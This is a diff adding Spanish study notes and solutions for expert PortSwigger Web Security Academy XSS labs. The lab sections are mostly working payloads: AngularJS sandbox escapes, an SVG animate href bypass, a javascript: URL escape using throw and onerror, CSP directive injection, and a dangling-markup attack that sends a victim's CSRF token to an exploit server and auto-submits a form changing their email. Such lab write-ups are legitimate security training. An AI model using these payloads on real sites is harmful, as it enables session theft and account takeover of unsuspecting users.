@@ -1408,6 +1408,18 @@ Luego pasamos una expresión al filtro ‘orderBy‘, y generamos el código des
 
 Este laboratorio demuestra cómo es posible romper entornos supuestamente seguros mediante manipulación de bajo nivel, sin depender de comillas o funciones evaluadoras explícitas.
 
+
+
+En esta segunda parte continuamos explotando un entorno de ‘XSS reflejado’ en AngularJS, donde no se permite el uso de cadenas, comillas, ni funciones como ‘eval‘. Reforzamos lo aprendido en la clase anterior y profundizamos en cómo manipular constructores y prototipos para ejecutar expresiones dentro del sandbox.
+
+El foco está en utilizar estructuras internas del lenguaje para fabricar dinámicamente código válido sin recurrir a literales de texto. Se emplean métodos como ‘toString()‘, ‘constructor‘, y ‘fromCharCode‘ para construir instrucciones como ‘alert(1)‘ a partir de sus equivalentes en código numérico.
+
+La clave del bypass sigue estando en redefinir el método ‘charAt‘ para interferir en el proceso de validación de AngularJS. Al combinar esto con filtros como ‘orderBy‘, conseguimos ejecutar código dentro de la plantilla sin activar las restricciones típicas del sandbox.
+
+Esta clase cierra el bloque de técnicas avanzadas sobre AngularJS, mostrando cómo una comprensión profunda de JavaScript y el comportamiento de los frameworks puede permitir la ejecución de código incluso en entornos fuertemente limitados.
+
+
+
 ## Laboratorio: XSS reflejado con escape de sandbox Angularjs sin cuerdas
 EXPERTO
 
@@ -1418,7 +1430,371 @@ Este laboratorio utiliza AngularJS de una manera inusual donde la función $ eva
 Para resolver el laboratorio, realice un ataque de secuencias de comandos de sitios cruzados que escape del sandbox y ejecute la función de alerta sin usar la función $ eval.
 
 
+Decimal Converter
 
+120,61,97,108,101,114,116,40,49,41 -> x=alert(1)
 
 
 /?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Escape de sandbox AngularJS con CSP
+En esta clase de nivel experto abordamos un entorno altamente restringido donde coexisten dos capas de protección: una política CSP que impide la ejecución directa de scripts no autorizados, y el sandbox de AngularJS, que filtra el acceso a objetos críticos como el contexto global del navegador.
+
+Para evadir ambas restricciones, construimos un vector que utiliza una expresión Angular inyectada dentro de un evento enfocado. Aprovechamos el evento ng-focus para ejecutar código al activarse el elemento y accedemos al objeto del evento a través de una variable predefinida por Angular. Esta variable contiene una ruta hacia el objeto window, sin necesidad de referenciarlo directamente, lo que nos permite eludir la validación del sandbox.
+
+La inyección se construye utilizando el filtro orderBy con un argumento malicioso. En lugar de invocar directamente la función de alerta, se asigna a una variable dentro del filtro, y esta se ejecuta cuando se alcanza el contexto de ejecución adecuado.
+
+Esta lección demuestra cómo es posible encadenar múltiples técnicas para vulnerar aplicaciones modernas protegidas por frameworks y políticas de seguridad del navegador, haciendo uso de pequeñas brechas lógicas dentro de los mecanismos de aislamiento.
+
+
+
+## Laboratorio: XSS reflejado con escape de sandbox AngularJS y CSP
+EXPERTO
+
+LAB
+No resuelto
+Este laboratorio utiliza CSP y AngularJS.
+
+Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que evite CSP, escape del entorno limitado de AngularJS y emita alertas document.cookie.
+
+
+
+
+
+- default-src 'self'   -> Permite cargar Recursos del mismo origen
+- script-src 'self'    -> Permite scripts del mismo Dominio,, no <scrip>, no eval
+- style-src 'unsafe-inline' 'self' -> Pemirmite estilos inline y del mismo origen
+
+
+
+
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
+
+
+
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
+
+
+<script>
+location.href='https://0a7d00b203f16a1980d1c68d00a100ce.web-security-academy.net/?search=<input id=x+ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x';
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+# XSS con eventos y atributos bloqueados
+En esta clase trabajamos con un entorno donde la inyección de código se limita a un conjunto restringido de etiquetas permitidas. Todos los eventos JavaScript y los atributos href están bloqueados, lo que impide usar vectores clásicos como enlaces con scripts o atributos on-click.
+
+Para evadir estas restricciones, utilizamos una estructura SVG compuesta que simula un enlace visual. Insertamos una etiqueta de animación dentro de un elemento interactivo y manipulamos un atributo gráfico permitido para que, al ser activado, modifique el valor del enlace con un esquema que ejecuta código.
+
+La animación se activa de forma implícita al interactuar con el contenido, y dado que se encuentra dentro de un SVG, el navegador interpreta la secuencia de forma válida aunque los filtros bloqueen atributos estándar. Además, se incluye la palabra Click como anzuelo visual para atraer al usuario simulado del laboratorio a realizar la acción.
+
+Este laboratorio demuestra cómo el uso creativo de etiquetas permitidas dentro de entornos gráficos como SVG puede servir para evadir restricciones avanzadas y ejecutar código malicioso en el navegador de la víctima.
+
+
+
+## Laboratorio: XSS reflejado con controladores de eventos y href atributos bloqueados
+EXPERTO
+
+LAB
+No resuelto
+Este laboratorio contiene una vulnerabilidad XSS reflejada con algunas etiquetas incluidas en la lista blanca, pero todos los eventos y anclajes href Los atributos están bloqueados.
+
+Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que inyecte un vector que, al hacer clic, llame al alert función.
+
+Tenga en cuenta que debe etiquetar su vector con la palabra "Clic" para inducir al usuario de laboratorio simulado a hacer clic en su vector. Por ejemplo:
+
+<a href="">Click me</a>
+
+
+
+
+
+
+
+1	a	200	495	false	false	3316	
+6	animate	200	456	false	false	3322	
+
+
+
+<svg>
+<a>
+<animate>
+</a>
+</svg>
+
+
+
+<svg>
+  <a>
+    <animate attributeName="href" values="javascript:alert('Click me')" begin="0s" dur="1s" fill="freeze">
+    test
+    </animate>
+  </a>
+</svg>
+
+
+<svg><a><animate attributeName=href values=javascript:alert(0)/><text>Click me</text></a></svg>
+
+
+
+
+
+
+
+
+# XSS en javascript: con caracteres limitados [1/2]
+En esta clase de nivel experto nos enfrentamos a un entorno donde la inyección se produce dentro de una URL con esquema JavaScript, pero con múltiples restricciones: algunos caracteres están bloqueados y no se permite el uso directo de espacios. A pesar de que puede parecer un desafío simple, la protección activa complica la ejecución directa del código.
+
+Para resolverlo, utilizamos una estructura avanzada basada en funciones flecha y manejo de errores. Creamos un bloque con una función que lanza una excepción. Luego, asignamos la función de alerta al manejador onerror, lo que nos permite ejecutarla indirectamente. Usamos una conversión de objeto a cadena para activar la ejecución, evitando el uso de paréntesis o llamadas explícitas a funciones.
+
+Además, insertamos el número 1337 dentro del contenido de la alerta como requiere el laboratorio. El exploit se dispara solo cuando se hace clic en el botón que redirige al blog, lo que simula un comportamiento realista donde el usuario completa la acción que activa el código.
+
+Este laboratorio muestra cómo, incluso con múltiples capas de restricción, es posible ejecutar código si se comprende a fondo el comportamiento del motor de JavaScript y se combinan constructores de lenguaje de forma creativa.
+
+En esta continuación del laboratorio anterior, profundizamos en técnicas avanzadas para ejecutar un XSS reflejado dentro de una URL con esquema JavaScript, enfrentándonos nuevamente a restricciones como bloqueo de espacios y caracteres especiales.
+
+El objetivo es perfeccionar el uso de estructuras complejas del lenguaje para forzar la ejecución del código. Mantenemos el enfoque en el uso de funciones flecha que permiten utilizar sentencias como throw, normalmente no válidas en expresiones, y combinamos esta técnica con la redefinición de propiedades internas como toString.
+
+Al forzar la conversión del objeto window a cadena, conseguimos activar la ejecución sin llamar a la función explícitamente. Esta variante demuestra cómo JavaScript puede ser manipulado para lograr ejecución de código incluso en contextos altamente filtrados, sin necesidad de paréntesis, comillas ni llamadas directas.
+
+Esta clase cierra el bloque sobre XSS en URLs JavaScript, mostrando cómo los vectores pueden disfrazarse como estructuras inofensivas y activarse en momentos controlados del flujo de navegación.
+
+
+## Laboratorio: XSS reflejado en una URL de JavaScript con algunos caracteres bloqueados
+EXPERTO
+
+LAB
+No resuelto
+Este laboratorio refleja su entrada en una URL de JavaScript, pero no todo es lo que parece. Inicialmente, esto parece un desafío trivial; sin embargo, la aplicación está bloqueando algunos caracteres en un intento de prevenir ataques XSS.
+
+Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert función con la cadena 1337 contenido en algún lugar del alert mensaje.
+
+
+
+<div class="is-linkback">
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=1'}).finally(_ => window.location = '/')">Back to Blog</a>
+</div>
+
+'},{x='
+
+&%27},{x=%27
+
+&%27},{x=%27
+
+
+&%27'},throw onerror=alert,1337,{x=&%27
+
+<div class="is-linkback">
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=1'},{''}).finally(_ => window.location = '/')">Back to Blog</a>
+</div>
+
+
+
+
+&%27},x=x=>{throw onerror=alert,1337},{x=%27
+
+
+&%27},x=x=>{throw/**/onerror=alert,1337},toString=x,windows%2b%27%27,{x=%27
+
+
+
+
+
+
+
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'
+
+<div class="is-linkback">
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:''}).finally(_ => window.location = '/')">Back to Blog</a>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+# XSS con CSP estricto y marcado colgante [1/2]
+En esta clase trabajamos con un entorno altamente restringido, donde una política CSP muy estricta impide la ejecución de código externo y bloquea las solicitudes a dominios no autorizados. A pesar de esto, existe una vulnerabilidad de XSS reflejado que podemos aprovechar mediante una técnica conocida como ataque de marcado colgante.
+
+La estrategia se divide en dos fases. En la primera, construimos un vector que, al ser activado por la víctima, redirige el navegador a una URL que contiene una etiqueta HTML rota. Esta etiqueta induce al navegador a reinterpretar la estructura del documento, permitiendo la ejecución de un segundo script alojado en un servidor de explotación autorizado. Dicho script envía información sensible (como el token CSRF) al servidor de Burp Collaborator utilizando métodos que no violan las restricciones de la política CSP.
+
+En la segunda fase, usamos ese token capturado para construir un formulario HTML malicioso que realiza una petición autenticada a la funcionalidad de cambio de correo del usuario. Este formulario es configurado con el token legítimo robado y se autoenvía cuando la víctima lo carga, cambiando su dirección a hacker@evil-user.net sin que lo note.
+
+Este laboratorio muestra cómo una combinación de XSS, manipulación de estructura HTML y técnicas de evasión de CSP puede conducir a una toma de control de cuenta incluso en entornos con múltiples capas de protección.
+
+## Laboratorio: XSS reflejado protegido por CSP muy estricto, con ataque de marcado colgante
+EXPERTO
+
+LAB
+No resuelto
+Este laboratorio utiliza un CSP estricto que bloquea las solicitudes salientes a sitios web externos.
+
+Para resolver el laboratorio, primero realice un ataque de secuencias de comandos entre sitios que evite el CSP y exfiltre el token CSRF de un usuario víctima simulado utilizando Burp Collaborator. Luego debe cambiar la dirección de correo electrónico del usuario simulado a hacker@evil-user.net.
+
+Debes etiquetar tu vector con la palabra "Clic" para inducir al usuario simulado a hacer clic en él. Por ejemplo:
+
+<a href="">Click me</a>
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter
+
+Nota
+Para evitar que la plataforma Academy se utilice para atacar a terceros, nuestro firewall bloquea las interacciones entre los laboratorios y sistemas externos arbitrarios. Para resolver el laboratorio, debe utilizar el servidor de exploits proporcionado y/o el servidor público predeterminado de Burp Collaborator.
+
+
+
+
+### PROPIO CSRF TOKER
+
+?email=prueba"></form><form class="login_form"  name="myform" action="https://exploit-0a2400b204217e7380b4022d011c006b.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click me</button
+
+
+
+
+exploit?csrf=6YNiudpd7F7W6sD9nl2Qie3PGMKMsMQt 
+
+
+
+
+### VICTIMA CSRF TOKER
+
+
+<script>
+location='https://0a820011041f7eca805f03e200c8007c.web-security-academy.net/my-account?email=prueba"></form><form class="login_form" name="myform" action="https://exploit-0a2400b204217e7380b4022d011c006b.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click me</button';
+</script>
+
+
+
+HAP91N784CKgac4Dprdu3B9e6KIZ8dKg 
+
+
+
+
+
+### ATAQUE ENVIO VICTIMA
+
+<html>
+<body>
+<form action="https://0a820011041f7eca805f03e200c8007c.web-security-academy.net/my-account/change-email" method="POST">
+<input type="hidden" name="email" value="hacker@evil-user.net" />
+<input type="hidden" name="csrf" value="HAP91N784CKgac4Dprdu3B9e6KIZ8dKg" />
+<input type="submit"  value="Click me" />
+</form>
+<script>
+history.pushState['', '', '/'];
+document.forms[0].submit();
+</script>
+</body>
+</html>
+
+hacker@evil-user.net
+
+
+
+
+
+
+
+
+
+
+
+
+
+# XSS con CSP y técnica de bypass
+En esta clase de nivel experto trabajamos con un entorno protegido por una política CSP que impide la ejecución de scripts inyectados, a pesar de que existe una vulnerabilidad de XSS reflejado. El sistema refleja el contenido enviado por el usuario, pero la política de seguridad bloquea cualquier intento de ejecución directa.
+
+La clave para resolver este laboratorio está en identificar que la cabecera CSP incluye una directiva de reporte que contiene un parámetro controlado por el usuario. Al modificar ese parámetro, es posible inyectar nuevas directivas dentro de la política CSP, lo que nos permite alterar su comportamiento desde fuera.
+
+Utilizamos este vector para insertar una nueva directiva script-src-elem y habilitar inline scripts. Esta directiva tiene precedencia sobre la más restrictiva script-src, permitiendo la ejecución de código directamente dentro de elementos script sin necesidad de cargar archivos externos o definir hashes.
+
+Este laboratorio demuestra cómo las políticas de seguridad mal configuradas, aunque parezcan estrictas, pueden ser manipuladas si exponen puntos de entrada en parámetros dinámicos. También subraya la importancia de mantener las directivas CSP completamente controladas desde el servidor y evitar cualquier forma de interpolación basada en parámetros del usuario.
+
+
+## Laboratorio: XSS reflejado protegido por CSP, con derivación de CSP
+EXPERTO
+
+LAB
+No resuelto
+Este laboratorio utiliza CSP y contiene una vulnerabilidad XSS reflejada.
+
+Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que evite el CSP y llame al alert función.
+
+Tenga en cuenta que la solución prevista para este laboratorio solo es posible en Chrome.
+
+
+
+
+<script>
+  alert(1);
+</script>
+
+
+
+Navigated to https://0abf005a037690c980974e1d0034004e.web-security-academy.net/?search=%3Cscript%3E+++alert%281%29%3B+%3C%2Fscript%3E
+?search=%3Cscript%3E+++alert%281%29%3B+%3C%2Fscript%3E:46 Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-EbQ8NvRvsSRl4kX/dsCcFOaG2QOaVivM1EJYsJYL6fA='), or a nonce ('nonce-...') is required to enable inline execution.
+
+
+
+
+
+
+
+
+
+
+
+Request URL
+https://0abf005a037690c980974e1d0034004e.web-security-academy.net/csp-report?token=
+Request Method
+POST
+Status Code
+200 OK
+Remote Address
+79.125.84.16:443
+Referrer Policy
+strict-origin-when-cross-origin
+
+
+
+content-encoding
+gzip
+content-length
+0
+content-security-policy
+default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+x-frame-options
+SAMEORIGIN
+
+
+
+
+
+
+
+?search=<script>alert(1);</script>&token=test;script-src-elem 'unsafe-inline'
